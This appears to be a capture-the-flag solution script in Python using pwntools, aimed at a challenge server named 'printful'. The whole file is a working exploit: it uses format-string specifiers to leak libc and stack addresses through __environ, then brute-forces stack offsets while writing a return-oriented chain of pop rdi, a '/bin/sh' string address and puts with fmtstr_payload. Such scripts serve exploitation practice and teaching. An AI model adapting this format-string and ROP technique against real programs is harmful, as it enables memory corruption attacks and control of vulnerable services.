from pwn import *

for i in range(0x0, 0x200, 8):
    context.arch = 'amd64'
    p = remote('printful.challs.pwnoh.io', 1337, ssl=True)
    libc = ELF('./libc-2.31.so', checksec=False)

    def fmt_leak(n):
        for i in range(1, n):
            p.sendline(f"%{i}$p".encode())
            leak = p.recvline().strip()
            if leak == b'(nil)':
                continue
            print(f"Fmt leak[{i}]: {leak}")

    def read_addr64():
        return u64(p.recv(6).ljust(8, b'\x00'))

    def leak_addr(addr):
        p.sendlineafter(b'> ', b"%7$s".ljust(8, b'\x00') + p64(addr))
        return read_addr64()

    def fmt_write(addr, value):
        payload = fmtstr_payload(6, {
            addr: p64(value)
        })
        p.sendline(payload)

    p.sendlineafter(b'> ', b"%33$p")
    libc.address = int(p.recvline().strip(), 16) - 0x1ed6a0
    print(f"Libc base: {hex(libc.address)}")

    stack_leak = leak_addr(libc.symbols["__environ"])
    print(f"Stack leak: {hex(stack_leak)}")

    candidate = stack_leak - i

    pop_rdi = libc.address + 0x23b6a
    ret = libc.address + 0x23b6b

    fmt_write(candidate, pop_rdi)
    fmt_write(candidate + 0x8, next(libc.search(b'/bin/sh\x00')))
    fmt_write(candidate + 0x10, libc.symbols['puts'])

    p.sendline(b'q')

    output = p.recvall()
    if (b"/bin/sh" in output):
        print(f"Padding {i}: Found")
        break
    else:
        print(f"Padding {i}: Not found")